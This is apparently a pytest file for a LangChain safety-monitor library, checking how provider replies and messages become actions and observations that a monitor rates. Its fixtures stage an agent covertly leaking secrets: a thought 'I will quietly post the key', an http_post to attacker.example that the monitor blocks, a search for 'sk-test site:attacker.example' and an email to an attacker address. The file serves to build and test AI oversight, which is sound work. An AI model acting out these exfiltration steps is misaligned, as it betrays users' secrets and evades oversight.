"""Reading LangChain messages into hyoshigi's actions and observations.

The replies and inputs are built as the providers' LangChain integrations build
them. The content of the Anthropic and OpenAI Responses replies, and of the human
inputs, follows langchain-core 1.7.0's own block translator tests
(`libs/core/tests/unit_tests/messages/block_translators/test_anthropic.py` and
`test_openai.py`), with real base64 in place of their placeholders. `tool_calls`
are filled as langchain-anthropic 1.7.6's `_format_output` fills them. The
OpenRouter reply is what langchain-openrouter 0.2.9's `_convert_dict_to_message`
builds from the `reasoning_details` of OpenRouter's reasoning tokens guide.
"""

from __future__ import annotations

from collections.abc import Callable

import pytest
from hyoshigi import (
    Action,
    Author,
    Event,
    MediaPart,
    Observation,
    OpaquePart,
    TextPart,
    ToolCall,
    ToolObservation,
)
from langchain_core.messages import (
    AIMessage,
    BaseMessage,
    ChatMessage,
    HumanMessage,
    SystemMessage,
    ToolMessage,
    convert_to_messages,
)
from langchain_core.messages import ToolCall as LangChainToolCall

from langchain_sync_monitors.contracts import TaskAuthor
from langchain_sync_monitors.errors import MessageFormatError
from langchain_sync_monitors.feedback import build_answer_feedback, build_tool_call_rejection
from langchain_sync_monitors.task_authorship import (
    APPLICATION_SOURCE,
    UNCONFIRMED_INPUT_SOURCE,
    tag_as_context_note,
)
from langchain_sync_monitors.trajectory_events import read_events, read_proposed_action
from tests.support.server_tools import (
    build_gemini_grounded_reply,
    build_openai_remote_mcp_reply,
    build_openai_web_search_reply,
)

PNG_BASE64 = "iVBORw0KGgo="
PNG_BYTES = b"\x89PNG\r\n\x1a\n"
PDF_BASE64 = "JVBERi0="
PDF_BYTES = b"%PDF-"
JPEG_BASE64 = "/9j/"
JPEG_BYTES = b"\xff\xd8\xff"
WAV_BASE64 = "UklGRg=="
WAV_BYTES = b"RIFF"
REFUSAL = "I can't help with that."
TASK = "Summarise q3.md."
PLACEHOLDER = OpaquePart(kind="server_tool_result")

READERS: dict[str, Callable[[AIMessage], list[Event]]] = {
    "history": lambda message: read_events(message, task_author=TaskAuthor.USER),
    "proposal": lambda message: [read_proposed_action(message)],
}
"""Both readers of a reply, each giving the events it reads."""

REPLIES: dict[str, tuple[AIMessage, Action]] = {
    "anthropic": (
        AIMessage(
            id="msg_01",
            content=[
                {"type": "thinking", "thinking": "foo", "signature": "foo_signature"},
                {"type": "redacted_thinking", "data": "EmwKAhgBEgy3va3pzix"},
                {"type": "text", "text": "Let's call a tool."},
                {
                    "type": "tool_use",
                    "id": "abc_123",
                    "name": "get_weather",
                    "input": {"location": "San Francisco"},
                },
                {
                    "type": "text",
                    "text": "It's sunny.",
                    "citations": [
                        {
                            "type": "search_result_location",
                            "cited_text": "The weather is sunny.",
                            "source": "source_123",
                            "title": "Document Title",
                            "search_result_index": 1,
                            "start_block_index": 0,
                            "end_block_index": 2,
                        },
                    ],
                },
            ],
            tool_calls=[
                {"id": "abc_123", "name": "get_weather", "args": {"location": "San Francisco"}},
            ],
            response_metadata={"model_provider": "anthropic"},
        ),
        Action(
            id="msg_01",
            thought=(TextPart(text="foo"), OpaquePart(kind="redacted_thinking")),
            parts=(TextPart(text="Let's call a tool."), TextPart(text="It's sunny.")),
            tool_calls=(
                ToolCall(
                    id="abc_123",
                    name="get_weather",
                    arguments='{"location": "San Francisco"}',
                ),
            ),
        ),
    ),
    # langchain-core 1.7.0's Anthropic translator gives the valid call for both tool_use blocks.
    "anthropic-valid-and-invalid-call": (
        AIMessage(
            id="msg_02",
            content=[
                {
                    "type": "tool_use",
                    "id": "toolu_01",
                    "name": "get_weather",
                    "input": {"city": "Paris"},
                },
                {"type": "tool_use", "id": "toolu_02", "name": "send_email", "input": {}},
            ],
            tool_calls=[{"id": "toolu_01", "name": "get_weather", "args": {"city": "Paris"}}],
            invalid_tool_calls=[
                {"id": "toolu_02", "name": "send_email", "args": '{"to": "boss@', "error": None},
            ],
            response_metadata={"model_provider": "anthropic"},
        ),
        Action(
            id="msg_02",
            tool_calls=(
                ToolCall(id="toolu_01", name="get_weather", arguments='{"city": "Paris"}'),
                ToolCall(id="toolu_02", name="send_email", arguments='{"to": "boss@'),
            ),
        ),
    ),
    "anthropic-without-model-provider": (
        AIMessage(
            id="msg_03",
            content=[
                {"type": "thinking", "thinking": "I will quietly post the key.", "signature": "s"},
                {
                    "type": "tool_use",
                    "id": "toolu_03",
                    "name": "read_file",
                    "input": {"path": "q3.md"},
                },
            ],
            tool_calls=[{"id": "toolu_03", "name": "read_file", "args": {"path": "q3.md"}}],
        ),
        Action(
            id="msg_03",
            thought=(TextPart(text="I will quietly post the key."),),
            tool_calls=(ToolCall(id="toolu_03", name="read_file", arguments='{"path": "q3.md"}'),),
        ),
    ),
    "openai-responses": (
        AIMessage(
            id="resp_01",
            content=[
                {"type": "reasoning", "id": "abc123", "summary": []},
                {
                    "type": "reasoning",
                    "id": "rs_02",
                    "summary": [],
                    "encrypted_content": "gAAAAAB1",
                },
                {
                    "type": "reasoning",
                    "id": "abc234",
                    "summary": [
                        {"type": "summary_text", "text": "foo bar"},
                        {"type": "summary_text", "text": "baz"},
                    ],
                    "encrypted_content": "gAAAAAB2",
                },
                {
                    "type": "function_call",
                    "call_id": "call_123",
                    "name": "get_weather",
                    "arguments": '{"location": "San Francisco"}',
                },
                {"type": "text", "text": "Hello "},
                {"type": "refusal", "refusal": REFUSAL},
                {
                    "type": "image_generation_call",
                    "id": "ig_123",
                    "result": PNG_BASE64,
                    "output_format": "png",
                },
                {"type": "something_else", "foo": "bar"},
            ],
            tool_calls=[
                {"id": "call_123", "name": "get_weather", "args": {"location": "San Francisco"}},
            ],
            response_metadata={"model_provider": "openai"},
        ),
        Action(
            id="resp_01",
            thought=(
                OpaquePart(kind="reasoning"),
                TextPart(text="foo bar"),
                OpaquePart(kind="reasoning"),
                TextPart(text="baz"),
            ),
            parts=(
                TextPart(text="Hello "),
                TextPart(text=REFUSAL),
                MediaPart(media_type="image/png", data=PNG_BYTES),
                OpaquePart(kind="something_else"),
            ),
            tool_calls=(
                ToolCall(
                    id="call_123",
                    name="get_weather",
                    arguments='{"location": "San Francisco"}',
                ),
            ),
        ),
    ),
    "openai-chat-refusal": (
        AIMessage(
            id="chatcmpl-01",
            content="",
            additional_kwargs={"refusal": REFUSAL},
            response_metadata={"model_provider": "openai"},
        ),
        Action(id="chatcmpl-01", parts=(TextPart(text=REFUSAL),)),
    ),
    # The Responses API at output_version="v0": the translator gives the kept refusal as a block.
    "openai-responses-v0-refusal": (
        AIMessage(
            id="resp_02",
            content=[],
            additional_kwargs={"refusal": REFUSAL},
            response_metadata={"model_provider": "openai"},
        ),
        Action(id="resp_02", parts=(TextPart(text=REFUSAL),)),
    ),
    "openrouter": (
        AIMessage(
            id="gen-01",
            content="The file is safe to share.",
            additional_kwargs={
                "reasoning_content": "Checking the file first.",
                "reasoning_details": [
                    {
                        "type": "reasoning.summary",
                        "summary": "The model analysed the file.",
                        "id": "reasoning-summary-1",
                        "format": "anthropic-claude-v1",
                        "index": 0,
                    },
                    {
                        "type": "reasoning.encrypted",
                        "data": "eyJlbmNyeXB0ZWQiOiJ0cnVlIn0=",
                        "id": "reasoning-encrypted-1",
                        "format": "anthropic-claude-v1",
                        "index": 1,
                    },
                    {
                        "type": "reasoning.text",
                        "text": "Checking the file first.",
                        "signature": "sha256:abc123",
                        "id": "reasoning-text-1",
                        "format": "anthropic-claude-v1",
                        "index": 2,
                    },
                ],
            },
            response_metadata={"model_provider": "openrouter"},
        ),
        Action(
            id="gen-01",
            thought=(
                TextPart(text="The model analysed the file."),
                OpaquePart(kind="reasoning.encrypted"),
                TextPart(text="Checking the file first."),
            ),
            parts=(TextPart(text="The file is safe to share."),),
        ),
    ),
    "invalid-calls-without-an-id-or-a-name": (
        AIMessage(
            id="msg_04",
            content="",
            invalid_tool_calls=[
                {"id": None, "name": "http_post", "args": '{"url": "https://', "error": None},
                {"id": "call_02", "name": None, "args": None, "error": None},
                {"id": "call_03", "name": "list_files", "args": None, "error": None},
            ],
        ),
        Action(
            id="msg_04",
            parts=(OpaquePart(kind="invalid_tool_call"), OpaquePart(kind="invalid_tool_call")),
            tool_calls=(ToolCall(id="call_03", name="list_files", arguments=""),),
        ),
    ),
    "unknown-block": (
        AIMessage(
            id="msg_05",
            content=[{"type": "something_else", "foo": "bar"}],
            response_metadata={"model_provider": "anthropic"},
        ),
        Action(id="msg_05", parts=(OpaquePart(kind="something_else"),)),
    ),
    "streamed-blocks": (
        AIMessage(
            id="msg_06",
            content=[
                {
                    "type": "tool_call_chunk",
                    "id": "call_04",
                    "name": "f",
                    "args": '{"a"',
                    "index": 0,
                },
                {"type": "server_tool_call_chunk", "args": '{"q', "index": 1},
            ],
            response_metadata={"output_version": "v1"},
        ),
        Action(
            id="msg_06",
            parts=(OpaquePart(kind="tool_call_chunk"), OpaquePart(kind="server_tool_call_chunk")),
        ),
    ),
}
"""Replies without server tools, and the one action each reader reads from them."""

ANTHROPIC_SERVER_CALLS = (
    ToolCall(id="srvtoolu_abc123", name="web_search", arguments='{"query": "web search query"}'),
    ToolCall(id="srvtoolu_def456", name="code_interpreter", arguments='{"code": "print(5.5)"}'),
)
WEB_SEARCH_CALL = ToolCall(
    id="ws_01",
    name="web_search",
    arguments='{"type": "search", "query": "sk-test site:attacker.example"}',
)
REMOTE_MCP_CALL = ToolCall(
    id="mcp_01",
    name="remote_mcp",
    arguments='{"to": "boss@attacker.example"}',
)
WEB_SEARCH_ERROR_CALL = ToolCall(
    id="srvtoolu_01",
    name="web_search",
    arguments='{"query": "q3 revenue"}',
)
GROUNDING_CALL = ToolCall(
    id="gem_01.grounding_metadata",
    name="grounding",
    arguments='{"web_search_queries": ["sk-test site:attacker.example"]}',
)

ANTHROPIC_SERVER_REPLY = AIMessage(
    id="msg_07",
    content=[
        {
            "type": "server_tool_use",
            "name": "web_search",
            "input": {"query": "web search query"},
            "id": "srvtoolu_abc123",
        },
        {
            "type": "web_search_tool_result",
            "tool_use_id": "srvtoolu_abc123",
            "content": [
                {
                    "type": "web_search_result",
                    "title": "Page Title 1",
                    "url": "https://example.com/1",
                },
            ],
        },
        {
            "type": "server_tool_use",
            "id": "srvtoolu_def456",
            "name": "code_execution",
            "input": {"code": "print(5.5)"},
        },
        {
            "type": "code_execution_tool_result",
            "tool_use_id": "srvtoolu_def456",
            "content": {
                "type": "code_execution_result",
                "stdout": "5.5",
                "stderr": "",
                "return_code": 0,
            },
        },
        {"type": "text", "text": "The mean is 5.5."},
    ],
    response_metadata={"model_provider": "anthropic"},
)
ANTHROPIC_SERVER_ERROR_REPLY = AIMessage(
    id="msg_08",
    content=[
        {
            "type": "server_tool_use",
            "id": "srvtoolu_01",
            "name": "web_search",
            "input": {"query": "q3 revenue"},
        },
        {
            "type": "web_search_tool_result",
            "tool_use_id": "srvtoolu_01",
            "content": {"type": "web_search_tool_result_error", "error_code": "max_uses_exceeded"},
        },
    ],
    response_metadata={"model_provider": "anthropic"},
)
OPENAI_WEB_SEARCH_REPLY = build_openai_web_search_reply().model_copy(update={"id": "resp_03"})
OPENAI_REMOTE_MCP_REPLY = build_openai_remote_mcp_reply().model_copy(update={"id": "resp_04"})
GEMINI_GROUNDED_REPLY = build_gemini_grounded_reply().model_copy(update={"id": "gem_01"})
# A grounded reply whose search found no sources, as langchain-google-genai 4.4.2 keeps it.
GEMINI_UNSOURCED_REPLY = AIMessage(
    "Nothing was found.",
    id="gem_02",
    response_metadata={
        "model_provider": "google_genai",
        "grounding_metadata": {
            "web_search_queries": ["sk-test site:attacker.example"],
            "grounding_chunks": [],
            "grounding_supports": [],
        },
    },
)
UNSOURCED_GROUNDING_CALL = ToolCall(
    id="gem_02.grounding_metadata",
    name="grounding",
    arguments='{"web_search_queries": ["sk-test site:attacker.example"]}',
)

SERVER_TOOL_HISTORIES: dict[str, tuple[AIMessage, list[Event]]] = {
    "anthropic": (
        ANTHROPIC_SERVER_REPLY,
        [
            Action(
                id="msg_07",
                parts=(TextPart(text="The mean is 5.5."),),
                tool_calls=ANTHROPIC_SERVER_CALLS,
            ),
            ToolObservation(
                call_id="srvtoolu_abc123",
                source="server",
                parts=(
                    TextPart(
                        text='[{"type": "web_search_result", "title": "Page Title 1", '
                        '"url": "https://example.com/1"}]',
                    ),
                ),
            ),
            ToolObservation(
                call_id="srvtoolu_def456",
                source="server",
                parts=(
                    TextPart(
                        text='{"type": "code_execution_result", "stdout": "5.5", '
                        '"stderr": "", "return_code": 0}',
                    ),
                ),
            ),
        ],
    ),
    "anthropic-error": (
        ANTHROPIC_SERVER_ERROR_REPLY,
        [
            Action(id="msg_08", tool_calls=(WEB_SEARCH_ERROR_CALL,)),
            ToolObservation(
                call_id="srvtoolu_01",
                source="server",
                is_error=True,
                parts=(
                    TextPart(
                        text='{"type": "web_search_tool_result_error", '
                        '"error_code": "max_uses_exceeded"}',
                    ),
                ),
            ),
        ],
    ),
    "openai-web-search": (
        OPENAI_WEB_SEARCH_REPLY,
        [
            Action(
                id="resp_03",
                parts=(TextPart(text="Nothing relevant came up."),),
                tool_calls=(WEB_SEARCH_CALL,),
            ),
            ToolObservation(call_id="ws_01", source="server", parts=()),
        ],
    ),
    "openai-remote-mcp": (
        OPENAI_REMOTE_MCP_REPLY,
        [
            Action(
                id="resp_04",
                parts=(TextPart(text="I emailed the summary."),),
                tool_calls=(REMOTE_MCP_CALL,),
            ),
            ToolObservation(call_id="mcp_01", source="server", parts=(TextPart(text="sent"),)),
        ],
    ),
    "gemini-grounding": (
        GEMINI_GROUNDED_REPLY,
        [
            Action(
                id="gem_01",
                parts=(TextPart(text="Q3 revenue grew 4%."),),
                tool_calls=(GROUNDING_CALL,),
            ),
            ToolObservation(
                call_id="gem_01.grounding_metadata",
                source="server",
                parts=(
                    TextPart(
                        text='[{"web": {"uri": "https://attacker.example/q3", "title": "Q3"}}]'
                    ),
                ),
            ),
        ],
    ),
}
"""Replies whose provider ran a server tool, and the events they add to the history."""

SERVER_TOOL_PROPOSALS: dict[str, tuple[AIMessage, Action]] = {
    "anthropic": (
        ANTHROPIC_SERVER_REPLY,
        Action(
            id="msg_07",
            parts=(PLACEHOLDER, PLACEHOLDER, TextPart(text="The mean is 5.5.")),
            tool_calls=ANTHROPIC_SERVER_CALLS,
        ),
    ),
    "anthropic-error": (
        ANTHROPIC_SERVER_ERROR_REPLY,
        Action(id="msg_08", parts=(PLACEHOLDER,), tool_calls=(WEB_SEARCH_ERROR_CALL,)),
    ),
    "openai-web-search": (
        OPENAI_WEB_SEARCH_REPLY,
        Action(
            id="resp_03",
            parts=(PLACEHOLDER, TextPart(text="Nothing relevant came up.")),
            tool_calls=(WEB_SEARCH_CALL,),
        ),
    ),
    "openai-remote-mcp": (
        OPENAI_REMOTE_MCP_REPLY,
        Action(
            id="resp_04",
            parts=(PLACEHOLDER, TextPart(text="I emailed the summary.")),
            tool_calls=(REMOTE_MCP_CALL,),
        ),
    ),
    "gemini-grounding": (
        GEMINI_GROUNDED_REPLY,
        Action(
            id="gem_01",
            parts=(TextPart(text="Q3 revenue grew 4%."), PLACEHOLDER),
            tool_calls=(GROUNDING_CALL,),
        ),
    ),
}
"""The same replies, and the action a monitor rates when each one is proposed."""

HUMAN_MESSAGES: dict[str, tuple[TaskAuthor, HumanMessage, Observation]] = {
    "user": (
        TaskAuthor.USER,
        HumanMessage(TASK),
        Observation(author=Author.USER, parts=(TextPart(text=TASK),)),
    ),
    "delegator": (
        TaskAuthor.PARENT_AGENT,
        HumanMessage(TASK),
        Observation(author=Author.DELEGATOR, parts=(TextPart(text=TASK),)),
    ),
    "monitor-feedback": (
        TaskAuthor.USER,
        build_answer_feedback(feedback="[Safety monitor] Do not post the key."),
        Observation(
            author=Author.MONITOR,
            parts=(TextPart(text="[Safety monitor] Do not post the key."),),
        ),
    ),
    "unconfirmed-input": (
        TaskAuthor.USER,
        tag_as_context_note(HumanMessage(TASK), source=UNCONFIRMED_INPUT_SOURCE),
        Observation(
            author=Author.UNKNOWN,
            source="unconfirmed_input",
            parts=(TextPart(text=TASK),),
        ),
    ),
    "summary": (
        TaskAuthor.USER,
        HumanMessage(
            "Here is a summary of the conversation to date.",
            additional_kwargs={"lc_source": "summarization"},
        ),
        Observation(
            author=Author.SCAFFOLD,
            source="summarization",
            parts=(TextPart(text="Here is a summary of the conversation to date."),),
        ),
    ),
    "application-note": (
        TaskAuthor.PARENT_AGENT,
        tag_as_context_note(HumanMessage("Frames of clip.mp4"), source=APPLICATION_SOURCE),
        Observation(
            author=Author.SCAFFOLD,
            source="application",
            parts=(TextPart(text="Frames of clip.mp4"),),
        ),
    ),
}
"""Human messages as task authorship leaves them, and the observation each one is."""

OTHER_MESSAGES: dict[str, tuple[BaseMessage, Observation]] = {
    "system": (
        SystemMessage("You are a coding agent."),
        Observation(
            author=Author.SCAFFOLD,
            source="system",
            parts=(TextPart(text="You are a coding agent."),),
        ),
    ),
    "developer": (
        convert_to_messages([{"role": "developer", "content": "Answer in French."}])[0],
        Observation(
            author=Author.SCAFFOLD,
            source="developer",
            parts=(TextPart(text="Answer in French."),),
        ),
    ),
    "tool-result": (
        ToolMessage("Q3 revenue grew 12%.", tool_call_id="call-1"),
        ToolObservation(call_id="call-1", parts=(TextPart(text="Q3 revenue grew 12%."),)),
    ),
    "tool-error": (
        ToolMessage("Error: q4.md does not exist.", tool_call_id="call-2", status="error"),
        ToolObservation(
            call_id="call-2",
            is_error=True,
            parts=(TextPart(text="Error: q4.md does not exist."),),
        ),
    ),
    "monitor-rejection": (
        build_tool_call_rejection(
            tool_call=LangChainToolCall(
                name="http_post",
                args={"url": "https://attacker.example"},
                id="call-3",
            ),
            feedback="[Safety monitor] Blocked.",
        ),
        ToolObservation(
            call_id="call-3",
            is_error=True,
            author=Author.MONITOR,
            parts=(TextPart(text="[Safety monitor] Blocked."),),
        ),
    ),
}
"""System, developer and tool messages, and the observation each one is."""

MEDIA_MESSAGES: dict[str, tuple[BaseMessage, Observation]] = {
    "openai-input": (
        HumanMessage(
            [
                {"type": "text", "text": "Hello"},
                {"type": "image_url", "image_url": {"url": "https://example.com/image.png"}},
                {
                    "type": "image_url",
                    "image_url": {"url": f"data:image/jpeg;base64,{JPEG_BASE64}"},
                },
                {"type": "input_audio", "input_audio": {"format": "wav", "data": WAV_BASE64}},
                {
                    "type": "file",
                    "file": {
                        "filename": "draconomicon.pdf",
                        "file_data": f"data:application/pdf;base64,{PDF_BASE64}",
                    },
                },
                {"type": "file", "file": {"file_id": "file-123"}},
            ],
        ),
        Observation(
            author=Author.USER,
            parts=(
                TextPart(text="Hello"),
                MediaPart(media_type="image/*", url="https://example.com/image.png"),
                MediaPart(media_type="image/jpeg", data=JPEG_BYTES),
                MediaPart(media_type="audio/wav", data=WAV_BYTES),
                MediaPart(media_type="application/pdf", data=PDF_BYTES),
                OpaquePart(kind="file"),
            ),
        ),
    ),
    "anthropic-input": (
        HumanMessage(
            [
                {"type": "text", "text": "foo"},
                {
                    "type": "document",
                    "source": {
                        "type": "base64",
                        "data": PDF_BASE64,
                        "media_type": "application/pdf",
                    },
                },
                {"type": "document", "source": {"type": "url", "url": "https://example.com/a.pdf"}},
                {
                    "type": "document",
                    "source": {
                        "type": "content",
                        "content": [{"type": "text", "text": "The grass is green"}],
                    },
                    "citations": {"enabled": True},
                },
                {
                    "type": "document",
                    "source": {
                        "type": "text",
                        "data": "The sky is blue",
                        "media_type": "text/plain",
                    },
                },
                {
                    "type": "image",
                    "source": {"type": "base64", "media_type": "image/jpeg", "data": JPEG_BASE64},
                },
                {"type": "image", "source": {"type": "url", "url": "https://example.com/b.png"}},
                {"type": "image", "source": {"type": "file", "file_id": "file_image_01"}},
                {"type": "document", "source": {"type": "file", "file_id": "file_pdf_01"}},
            ],
        ),
        Observation(
            author=Author.USER,
            parts=(
                TextPart(text="foo"),
                MediaPart(media_type="application/pdf", data=PDF_BYTES),
                MediaPart(media_type="application/octet-stream", url="https://example.com/a.pdf"),
                OpaquePart(kind="document"),
                TextPart(text="The sky is blue"),
                MediaPart(media_type="image/jpeg", data=JPEG_BYTES),
                MediaPart(media_type="image/*", url="https://example.com/b.png"),
                OpaquePart(kind="image"),
                OpaquePart(kind="file"),
            ),
        ),
    ),
    "standard-blocks": (
        HumanMessage(
            [
                {"type": "video", "url": "https://example.com/clip.mp4"},
                {"type": "audio", "url": "https://example.com/note.mp3"},
                {"type": "text-plain", "base64": "aGk=", "mime_type": "text/plain"},
                {"type": "something_else", "foo": "bar"},
                {"type": "reasoning", "reasoning": "Not the user's."},
            ],
        ),
        Observation(
            author=Author.USER,
            parts=(
                MediaPart(media_type="video/*", url="https://example.com/clip.mp4"),
                MediaPart(media_type="audio/*", url="https://example.com/note.mp3"),
                MediaPart(media_type="text/plain", data=b"hi"),
                OpaquePart(kind="something_else"),
                OpaquePart(kind="reasoning"),
            ),
        ),
    ),
    "tool-screenshot": (
        ToolMessage(
            [
                {"type": "text", "text": "Screenshot taken."},
                {"type": "image", "base64": PNG_BASE64, "mime_type": "image/png"},
            ],
            tool_call_id="call-4",
        ),
        ToolObservation(
            call_id="call-4",
            parts=(
                TextPart(text="Screenshot taken."),
                MediaPart(media_type="image/png", data=PNG_BYTES),
            ),
        ),
    ),
}
"""Messages carrying media, and the observation each one is."""

MALFORMED_MESSAGES: dict[str, tuple[BaseMessage, str]] = {
    "text-that-is-not-text": (
        HumanMessage([{"type": "text", "text": 7}]),
        "HumanMessage.content_blocks[0]: expected a text block with its text",
    ),
    "invalid-base64": (
        HumanMessage([{"type": "image", "base64": "aGk=!", "mime_type": "image/png"}]),
        "HumanMessage.content_blocks[0]: expected base64 data",
    ),
    "invalid-media-type": (
        ToolMessage(
            [{"type": "image", "url": "https://example.com/a", "mime_type": "png"}],
            tool_call_id="call-5",
        ),
        "ToolMessage.content_blocks[0]: expected an IANA media type",
    ),
    "reasoning-detail-without-text": (
        AIMessage(
            id="msg_09",
            content="",
            additional_kwargs={"reasoning_details": [{"type": "reasoning.text", "signature": "s"}]},
        ),
        "AIMessage.additional_kwargs.reasoning_details[0]: "
        "expected a reasoning detail with its text or summary",
    ),
    "tool-call-without-an-id": (
        AIMessage(
            id="msg_10",
            content="",
            tool_calls=[{"name": "read_file", "args": {"path": "q3.md"}, "id": None}],
        ),
        "AIMessage.tool_calls[0]: expected a tool call with an id",
    ),
    "server-result-without-a-call-id": (
        AIMessage(
            id="msg_11",
            content=[
                {"type": "server_tool_result", "status": "success", "output": "API_KEY=sk-test"}
            ],
            response_metadata={"output_version": "v1"},
        ),
        "AIMessage.content_blocks[0]: expected a server tool result with its call id",
    ),
    "another-message-type": (
        ChatMessage(content="Ship it.", role="critic"),
        "ChatMessage: expected an AI, human, system or tool message",
    ),
}
"""Messages the reader cannot read, and the error each one raises."""


@pytest.mark.parametrize("read", READERS.values(), ids=READERS.keys())
@pytest.mark.parametrize(("reply", "action"), REPLIES.values(), ids=REPLIES.keys())
def test_a_reply_without_server_tools_is_one_action_under_either_reader(
    read: Callable[[AIMessage], list[Event]],
    reply: AIMessage,
    action: Action,
) -> None:
    # Act
    events = read(reply)

    # Assert
    assert events == [action]


@pytest.mark.parametrize(
    ("reply", "history"),
    SERVER_TOOL_HISTORIES.values(),
    ids=SERVER_TOOL_HISTORIES.keys(),
)
def test_a_server_tool_result_in_the_history_is_the_server_s_observation_after_the_action(
    reply: AIMessage,
    history: list[Event],
) -> None:
    # Act
    events = read_events(reply, task_author=TaskAuthor.USER)

    # Assert
    assert events == history


@pytest.mark.parametrize(
    ("reply", "proposed"),
    SERVER_TOOL_PROPOSALS.values(),
    ids=SERVER_TOOL_PROPOSALS.keys(),
)
def test_a_server_tool_result_in_a_rated_reply_is_an_opaque_part_where_it_stood(
    reply: AIMessage,
    proposed: Action,
) -> None:
    # Act
    action = read_proposed_action(reply)

    # Assert
    assert action == proposed


def test_a_grounded_reply_whose_search_found_nothing_still_has_the_server_s_observation() -> None:
    # Act
    events = read_events(GEMINI_UNSOURCED_REPLY, task_author=TaskAuthor.USER)

    # Assert
    assert events == [
        Action(
            id="gem_02",
            parts=(TextPart(text="Nothing was found."),),
            tool_calls=(UNSOURCED_GROUNDING_CALL,),
        ),
        ToolObservation(call_id="gem_02.grounding_metadata", source="server", parts=()),
    ]


def test_a_rated_grounded_reply_whose_search_found_nothing_still_fails_closed() -> None:
    # Act
    action = read_proposed_action(GEMINI_UNSOURCED_REPLY)

    # Assert
    assert action == Action(
        id="gem_02",
        parts=(TextPart(text="Nothing was found."), PLACEHOLDER),
        tool_calls=(UNSOURCED_GROUNDING_CALL,),
    )


@pytest.mark.parametrize(
    ("task_author", "message", "observation"),
    HUMAN_MESSAGES.values(),
    ids=HUMAN_MESSAGES.keys(),
)
def test_a_human_message_is_observed_as_written_by_the_author_its_tag_names(
    task_author: TaskAuthor,
    message: HumanMessage,
    observation: Observation,
) -> None:
    # Act
    events = read_events(message, task_author=task_author)

    # Assert
    assert events == [observation]


@pytest.mark.parametrize(
    ("message", "observation"), OTHER_MESSAGES.values(), ids=OTHER_MESSAGES.keys()
)
def test_a_system_or_tool_message_is_one_observation_by_its_writer(
    message: BaseMessage,
    observation: Observation,
) -> None:
    # Act
    events = read_events(message, task_author=TaskAuthor.USER)

    # Assert
    assert events == [observation]


@pytest.mark.parametrize(
    ("message", "observation"), MEDIA_MESSAGES.values(), ids=MEDIA_MESSAGES.keys()
)
def test_media_becomes_media_parts_by_url_or_bytes_and_media_without_either_is_opaque(
    message: BaseMessage,
    observation: Observation,
) -> None:
    # Act
    events = read_events(message, task_author=TaskAuthor.USER)

    # Assert
    assert events == [observation]


@pytest.mark.parametrize(
    ("message", "error"),
    MALFORMED_MESSAGES.values(),
    ids=MALFORMED_MESSAGES.keys(),
)
def test_a_malformed_message_raises_naming_where_and_quoting_nothing(
    message: BaseMessage,
    error: str,
) -> None:
    # Act
    with pytest.raises(MessageFormatError) as raised:
        read_events(message, task_author=TaskAuthor.USER)

    # Assert
    assert str(raised.value) == error


@pytest.mark.parametrize("read", READERS.values(), ids=READERS.keys())
@pytest.mark.parametrize("message_id", [None, ""], ids=["none", "empty"])
def test_an_ai_message_without_an_id_raises(
    read: Callable[[AIMessage], list[Event]],
    message_id: str | None,
) -> None:
    # Arrange
    reply = AIMessage("Done.", id=message_id)

    # Act
    with pytest.raises(MessageFormatError) as raised:
        read(reply)

    # Assert
    assert str(raised.value) == "AIMessage.id: expected an id"
